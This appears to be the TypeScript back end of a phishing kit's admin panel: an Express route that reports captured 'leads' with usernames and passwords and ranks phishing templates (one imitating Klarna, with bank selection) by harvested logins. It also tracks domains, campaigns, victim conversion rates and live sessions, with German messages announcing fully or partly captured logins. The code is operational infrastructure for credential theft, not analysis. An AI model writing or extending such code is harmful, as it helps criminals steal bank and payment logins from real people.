import express from 'express';
import { getDb } from '../database';
import { authenticateJWT } from '../middleware';

const router = express.Router();

// Get comprehensive dashboard statistics
router.get('/stats', authenticateJWT, async (req, res) => {
  const { range = '7d' } = req.query;
  
  try {
    const db = getDb();
    
    // Time filter for range-based queries
    let timeFilter = "datetime('now', '-7 days')";
    if (range === '24h') timeFilter = "datetime('now', '-1 day')";
    if (range === '30d') timeFilter = "datetime('now', '-30 days')";
    if (range === '90d') timeFilter = "datetime('now', '-90 days')";
    
    // ===== LEAD STATISTICS =====
    
    // Total leads (including partial leads)
    const totalLeads = db.prepare('SELECT COUNT(*) as count FROM leads').get() as { count: number };
    
    // Completed leads (traditional completed status)
    const completedLeads = db.prepare(`
      SELECT COUNT(*) as count FROM leads 
      WHERE status = 'completed'
    `).get() as { count: number };
    
    // Partial leads (new category)
    const partialLeads = db.prepare(`
      SELECT COUNT(*) as count FROM leads 
      WHERE status LIKE 'partial%'
    `).get() as { count: number };
    
    // New leads (not yet contacted)
    const newLeads = db.prepare(`
      SELECT COUNT(*) as count FROM leads 
      WHERE status = 'new'
    `).get() as { count: number };
    
    // Contacted leads
    const contactedLeads = db.prepare(`
      SELECT COUNT(*) as count FROM leads 
      WHERE status = 'contacted'
    `).get() as { count: number };
    
    // Recent leads (in selected time range)
    const recentLeads = db.prepare(`
      SELECT COUNT(*) as count FROM leads 
      WHERE created_at > ${timeFilter}
    `).get() as { count: number };
    
    // Leads with email
    const leadsWithEmail = db.prepare(`
      SELECT COUNT(*) as count FROM leads 
      WHERE email IS NOT NULL AND email != ''
    `).get() as { count: number };
    
    // Leads with phone
    const leadsWithPhone = db.prepare(`
      SELECT COUNT(*) as count FROM leads 
      WHERE phone IS NOT NULL AND phone != ''
    `).get() as { count: number };
    
    // Leads with login credentials
    const leadsWithCredentials = db.prepare(`
      SELECT COUNT(*) as count FROM leads 
      WHERE username IS NOT NULL AND username != '' 
      AND password IS NOT NULL AND password != ''
    `).get() as { count: number };
    
    // ===== TEMPLATE STATISTICS =====
    
    const totalTemplates = db.prepare('SELECT COUNT(*) as count FROM templates WHERE is_active = 1').get() as { count: number };
    
    // Leads by template (including partial)
    const leadsByTemplate = db.prepare(`
      SELECT 
        t.folder_name as template_name,
        t.name as template_display_name,
        COUNT(l.id) as total_leads,
        SUM(CASE WHEN l.status = 'completed' THEN 1 ELSE 0 END) as completed_leads,
        SUM(CASE WHEN l.status LIKE 'partial%' THEN 1 ELSE 0 END) as partial_leads,
        SUM(CASE WHEN l.status = 'new' THEN 1 ELSE 0 END) as new_leads
      FROM templates t
      LEFT JOIN leads l ON l.template_id = t.id
      WHERE t.is_active = 1
      GROUP BY t.id
      ORDER BY total_leads DESC
    `).all();
    
    // ===== DOMAIN STATISTICS =====
    
    const activeDomains = db.prepare('SELECT COUNT(*) as count FROM domains WHERE is_active = 1').get() as { count: number };
    
    // ===== CAMPAIGN STATISTICS =====
    
    const totalCampaigns = db.prepare('SELECT COUNT(*) as count FROM campaigns').get() as { count: number };
    
    // ===== VISITOR STATISTICS =====
    
    const totalVisitors = db.prepare('SELECT COUNT(*) as count FROM tracking').get() as { count: number };
    const recentVisitors = db.prepare(`
      SELECT COUNT(*) as count FROM tracking 
      WHERE last_visit >= ${timeFilter}
    `).get() as { count: number };
    
    // ===== CONVERSION RATE =====
    
    const conversionStats = db.prepare(`
      SELECT 
        COUNT(*) as total_visitors,
        SUM(CASE WHEN converted_to_lead = 1 THEN 1 ELSE 0 END) as converted_visitors
      FROM tracking
    `).get() as { total_visitors: number; converted_visitors: number };
    
    const conversionRate = conversionStats.total_visitors > 0 
      ? ((conversionStats.converted_visitors / conversionStats.total_visitors) * 100)
      : 0;
    
    // ===== GROWTH CALCULATIONS =====
    
    // Previous period for comparison
    let previousTimeFilter = "datetime('now', '-14 days')";
    if (range === '24h') previousTimeFilter = "datetime('now', '-2 days')";
    if (range === '30d') previousTimeFilter = "datetime('now', '-60 days')";
    if (range === '90d') previousTimeFilter = "datetime('now', '-180 days')";
    
    const previousLeads = db.prepare(`
      SELECT COUNT(*) as count FROM leads 
      WHERE created_at BETWEEN ${previousTimeFilter} AND ${timeFilter}
    `).get() as { count: number };
    
    const leadsGrowth = previousLeads.count > 0 
      ? (((recentLeads.count - previousLeads.count) / previousLeads.count) * 100)
      : recentLeads.count > 0 ? 100 : 0;
    
    // ===== RECENT ACTIVITY =====
    
    const recentActivity = db.prepare(`
      SELECT 
        l.id,
        l.created_at,
        l.status,
        l.name,
        l.email,
        l.username,
        l.additional_data,
        COALESCE(t.name, 'Unknown Template') as template_display_name,
        COALESCE(t.folder_name, 'unknown') as template_name
      FROM leads l
      LEFT JOIN templates t ON l.template_id = t.id
      ORDER BY l.created_at DESC
      LIMIT 10
    `).all();
    
    // ===== ACTIVE SESSIONS =====
    
    const activeSessions = db.prepare(`
      SELECT COUNT(*) as count FROM sessions 
      WHERE is_completed = 0 
      AND updated_at > datetime('now', '-1 hour')
    `).get() as { count: number };
    
    res.json({
      stats: {
        // Main counters
        totalLogs: totalLeads.count, // Total logs (finished + unfinished)
        completedLogs: completedLeads.count, // Finished logs
        partialLogs: partialLeads.count, // Unfinished logs
        newLogs: newLeads.count,
        contactedLogs: contactedLeads.count,
        
        // Other stats
        totalTemplates: totalTemplates.count,
        activeDomains: activeDomains.count,
        totalCampaigns: totalCampaigns.count,
        totalVisitors: totalVisitors.count,
        activeVisitors: activeSessions.count,
        
        // Data quality
        leadsWithEmail: leadsWithEmail.count,
        leadsWithPhone: leadsWithPhone.count,
        leadsWithCredentials: leadsWithCredentials.count,
        
        // Conversion
        conversionRate: parseFloat(conversionRate.toFixed(2)),
        
        // Time-based
        recentLeads: recentLeads.count,
        recentVisitors: recentVisitors.count
      },
      trends: {
        leadsGrowth: parseFloat(leadsGrowth.toFixed(1))
      },
      templatePerformance: leadsByTemplate,
      recentActivity: recentActivity.map(activity => {
        // Extract selectedBank for Klarna composite icons
        let selectedBank = null;
        if (activity.template_name === 'klarna' && activity.additional_data) {
          try {
            const additionalData = JSON.parse(activity.additional_data);
            selectedBank = additionalData.selected_bank || 
                          additionalData.login_data?.bank_type || 
                          additionalData.bank_type ||
                          additionalData.bankType ||
                          additionalData.bank ||
                          additionalData.selectedBank ||
                          'generic';
          } catch (error) {
            selectedBank = 'generic';
          }
        }

        return {
          id: activity.id,
          type: activity.status.includes('partial') ? 'partial_lead' : 'lead',
          template: activity.template_name, // Use folder_name for proper icon display
          selectedBank: selectedBank, // Add selectedBank for Klarna composite icons
          templateDisplayName: activity.template_display_name, // Keep display name for reference
          message: activity.status.includes('partial') 
            ? `Teilweise Daten erfasst (${activity.name || activity.username || activity.email || 'Unbekannt'})`
            : `Vollständige Anmeldung erfasst (${activity.name || activity.username || activity.email || 'Unbekannt'})`,
          time: getRelativeTime(activity.created_at),
          status: activity.status
        };
      })
    });
  } catch (error) {
    console.error('Error fetching dashboard statistics:', error);
    res.status(500).json({ error: 'Failed to fetch dashboard statistics' });
  }
});

// Helper function to get relative time
function getRelativeTime(dateString: string): string {
  const date = new Date(dateString);
  const now = new Date();
  const diffInMinutes = Math.floor((now.getTime() - date.getTime()) / (1000 * 60));
  
  if (diffInMinutes < 1) return 'Gerade eben';
  if (diffInMinutes < 60) return `${diffInMinutes} Min`;
  
  const diffInHours = Math.floor(diffInMinutes / 60);
  if (diffInHours < 24) return `${diffInHours} Std`;
  
  const diffInDays = Math.floor(diffInHours / 24);
  return `${diffInDays} Tag${diffInDays > 1 ? 'e' : ''}`;
}

export default router;
